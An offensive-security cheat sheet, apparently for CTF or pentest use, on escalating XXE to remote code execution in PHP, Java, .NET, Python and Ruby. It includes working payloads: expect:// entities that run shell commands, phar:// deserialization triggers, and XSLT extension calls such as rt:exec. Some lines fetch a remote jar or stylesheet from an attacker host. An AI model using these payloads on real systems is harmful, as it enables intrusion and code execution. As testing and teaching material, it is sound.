# XXE → RCE — the escalation paths

## The honest scale — XXE is usually file-read, not exec

XXE reads files and fetches URLs. RCE paths are narrow and stack-
dependent — enumerate them, don't assume them.

## `expect://` — direct exec (PHP)

```
<!ENTITY x SYSTEM "expect://id">
<!ENTITY x SYSTEM "expect://cat%20/flag">
```

The `expect` PECL stream wrapper runs the string as a shell command —
the entity value IS the command output. Requires `expect` extension —
`php -m | grep expect`, rare, devastating. First check on PHP targets.

## `phar://` — deserialization trigger (PHP)

```
<!ENTITY x SYSTEM "phar:///path/to/app/upload/x.phar/anything">
```

A `phar://` access unserializes the phar's metadata — if you can place
a phar (a prior upload, `php://filter` write, or a known phar on disk —
`file:///usr/share/php/...`), the metadata unserialize runs gadget
chains — the XXE becomes the *trigger* for `web-deserialization`.

## The file-write chain — XXE reads, then writes via a second bug

XXE alone doesn't write. But:
- `php://filter/convert.base64-decode/resource=...` — the filters that
  WRITE via streams — need a `file_put_contents`-style call elsewhere
- XXE-read source → find an unserialize endpoint / a file-upload → the
  write path — chain two bugs, record each separately

## The `jar:`-remote-classpath (Java) — narrow

`jar:http://YOU/x.jar!/...` — Java fetches remote jars — if a parser
or schema-loader treats the fetched jar's contents as code (a custom
`EntityResolver` loading classes, a `SchemaFactory` loading schema-
defined handlers) — RCE. Rare; mostly a fetch primitive.

## The SSRF-to-admin-RCE — XXE as the pivot

XXE hits `http://127.0.0.1:port/` internal services — `ssrf-via-xxe.md`:
- an internal Tomcat/manager, an admin panel, a Redis/Elastic/gopher
  service → exploit the internal service → RCE — the XXE was the
  transport, not the exec

## The XInclude/`xml-stylesheet`/XSLT path — a real exec surface

```xml
<?xml-stylesheet type="text/xsl" href="http://YOU/evil.xsl"?>
```

If the parser or pipeline evaluates XSLT — XSLT is a programming
language — `document()`/`xsl:include`/`system-property()`/
extension-functions (`EXSLT`, `msxsl:script`, Java extensions) —
an XXE that reaches an XSLT processor = code execution surface.
Fires when: app does `XSLTransform`, a doc with `xml-stylesheet` is
auto-processed, or the parser honors stylesheet PIs.

## The `saxon`/`.NET`-specific XSLT exec

- Saxon (Java/.NET): extension functions reach Java/.NET methods —
  `<xsl:value-of select="rt:exec(rt:getRuntime(),'id')"/>` style
- `msxsl:script` — .NET XSLT inline C#/JScript — classic XXE→XSLT→RCE
- `exsl:node-set`/`dyn:evaluate` — expression evaluation

## The parser's own extension mechanisms — XSLT/schema/processing

- `xsd:import`/`xsd:include`/`xsd:redefine` — schema files are XML —
  fetched — schema-validating parsers fetch imports — OOB + content
- `xml-model`/`xml-stylesheet` PIs — fetched
- DocBook/DITA `conref`/transclusion — fetched

## The honest answer per stack

| Stack | RCE path |
|---|---|
| PHP | `expect://` (rare) · `phar://` deser · XSLT exec via `libxslt`/`XSLTProcessor` |
| Java | `jar:` classpath tricks · XSLT extension functions · SSRF-to-internal |
| .NET | `msxsl:script` in XSLT · `XmlResolver`+`BinaryFormatter`-adjacent (rare) |
| Python | `lxml` XSLT + `lxml.etree.XSLT` with extensions · SSRF pivot |
| Ruby | Nokogiri XSLT |
| Node/Go | essentially none via parser |

## The chain discipline — record the layers

XXE → file-read → source-leak → credential → admin → upload → RCE is a
five-link chain — record each link's evidence separately; don't claim
RCE from the XXE alone.

## Falsifiers

- parser has no XSLT/extension support AND no `expect`/`phar` AND no
  internal service → XXE stays a read primitive — accept that; the flag
  may still sit in a file
